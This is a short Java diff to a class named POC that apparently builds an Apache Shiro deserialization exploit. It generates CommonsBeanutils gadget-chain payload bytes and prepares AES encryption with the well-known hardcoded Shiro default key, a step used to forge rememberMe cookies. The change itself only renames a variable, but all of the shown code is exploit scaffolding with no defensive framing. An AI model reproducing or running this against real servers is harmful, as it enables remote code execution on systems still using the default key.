@@ -8,8 +8,8 @@ public class POC {
 //        CommonsCollections3 cc3 = new CommonsCollections3();
 //        byte[] temp = cc3.getPOCBytes();
 
-        CommonsBeanutilsPoc cc3 = new CommonsBeanutilsPoc();
-        byte[] temp = cc3.getPOCBytes();
+        CommonsBeanutilsPoc commonsBeanutilsPoc = new CommonsBeanutilsPoc();
+        byte[] temp = commonsBeanutilsPoc.getPOCBytes();
 
         AesCipherService aesCipherService = new AesCipherService();
         byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));
